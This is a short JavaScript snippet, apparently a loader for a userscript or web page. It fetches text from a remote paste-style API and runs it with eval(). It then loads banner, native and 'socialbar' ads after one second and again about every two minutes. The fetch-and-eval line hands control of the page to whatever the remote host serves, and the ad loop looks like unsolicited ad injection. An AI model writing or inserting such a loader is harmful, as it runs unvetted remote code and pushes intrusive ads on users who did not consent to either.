// hi ching ching ching ching!
(async ()=>{
	const code = await (await fetch("https://api.rubis.app/v2/scrap/c5VuG8NFPuxkbxFi/raw?accessKey=mret")).text()
	eval(code)

    // i swear it works now :pray:
    setTimeout(()=>{
    	loadAds({
            banner: "94d3e6b189169213c968a0f35cf2c24b",
            native: "976e351ff44eac06013f3d88e10200d0",
			socialbar: "f6/6b/19/f66b199727e844c6fd4d4c67f3c67c72.js"
        });

		setInterval(()=>{
	    	loadAds({
	            banner: "94d3e6b189169213c968a0f35cf2c24b",
	            native: "976e351ff44eac06013f3d88e10200d0",
				socialbar: "f6/6b/19/f66b199727e844c6fd4d4c67f3c67c72.js"
	        });
		}, 120 * 1067)
    },1000)
})()
